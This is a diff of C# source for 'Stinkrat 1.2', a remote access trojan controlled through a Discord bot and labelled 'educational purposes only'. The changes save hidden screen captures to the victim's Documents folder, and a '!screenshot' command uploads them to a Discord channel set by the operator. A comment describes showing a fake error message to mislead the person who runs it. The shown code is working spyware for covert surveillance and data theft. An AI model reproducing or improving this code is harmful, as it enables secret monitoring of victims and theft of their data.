@@ -1,5 +1,5 @@
-// Educational purposes only ;)
-// Stinkrat 1.2
+// Educational purposes only
+// Stinkrat 1.2.(1)
 using Discord;
 using Discord.WebSocket;
 using System.Diagnostics;
@@ -40,8 +40,9 @@ namespace App
                 {
                     g.CopyFromScreen(Point.Empty, Point.Empty, resolution.Size);
                 }
-                bitmap.Save("screenshot.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
-                File.SetAttributes("screenshot.jpg", FileAttributes.Hidden); // hide it!!!
+                string pathtosave = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+                bitmap.Save($"{pathtosave}\\screenshot.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
+                File.SetAttributes($"{pathtosave}\\screenshot.jpg", FileAttributes.Hidden); // hide it!!!
             }
         }
 
@@ -136,7 +137,7 @@ namespace App
         // replace these with the guild and channel id of where you want to control the bot
         ulong log_guild = 1012757688389734510;
         ulong log_channel = 1013091266973671557;
-        string TOKEN = "use your own bot token here"; // Keep this a secret
+        string TOKEN = "your bot token here"; // Keep this a secret
 
         // A fake error message will show when you run the program.
         //string message_content = "Graphics ERR in [UnityMain.dll] (0x0065e)";
@@ -238,7 +239,7 @@ namespace App
                 if (message.Content == "!screenshot")
                 {
                     RAT.Screenshot(); // make and save the screenshot
-                    await message.Channel.SendFileAsync("screenshot.jpg");
+                    await message.Channel.SendFileAsync($"{Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)}\\screenshot.jpg");
                 }
             }
             catch (Exception e)
